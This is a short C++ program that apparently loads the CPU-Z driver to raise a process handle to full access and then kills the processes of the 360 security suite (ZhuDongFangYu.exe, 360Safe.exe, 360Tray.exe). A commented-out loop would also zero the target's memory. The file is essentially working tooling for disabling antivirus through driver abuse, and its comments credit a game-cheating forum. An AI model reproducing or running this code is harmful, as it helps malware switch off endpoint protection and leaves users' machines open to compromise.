#include "windefs.h"
#include <stdio.h>
#include <stdlib.h>
#include "process.hpp"
#include "dyn_data.hpp"
typedef unsigned int uint;
// huoji @ 2018|2|8
// 感谢 MarkHC@unknowncheats.me 对我的指导与帮助.
bool ElevateHande(HANDLE handle)
{
	if (process::attach(GetCurrentProcessId())) {
		if (!process::grant_handle_access(handle, PROCESS_ALL_ACCESS))
		{
			printf("\n Failed to set handle access \n");
			return false;
		}		
		process::detach();
	}
	printf("Handle: %d", (int)handle);
	return true;
}
void killPs(wchar_t* Name)
{
	auto pid = process::find(Name);
	auto handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (ElevateHande(handle))
	{
		printf("\n %ls: ElevateHande success ,Here We go \n", Name);
		//现在可以直接结束进程了
		DWORD ret = TerminateProcess(handle, 0);
		if (ret == 0) {
			wprintf(L"%d", GetLastError());
		}

		/*
		for (uint i = 0x0; i < 0xFFF00000; i++)
		{
			if (!handle)
			{
				printf("\n Killed %s \n", Name);
				return;
			}

			// let's go
			WriteProcessMemory(handle, (LPVOID)i, (LPVOID)0x00, sizeof(i), NULL);
		}*/
	}
	else {
		printf("\n Failed to ElevateHande access \n");
	}
	CloseHandle(handle);
}
int main()
{
	//加载Cpuz驱动
	dyn_data::LoadCpuz();
	killPs(L"ZhuDongFangYu.exe");
	killPs(L"360Safe.exe");
	killPs(L"360Tray.exe");
	system("pause");
    return 0;
}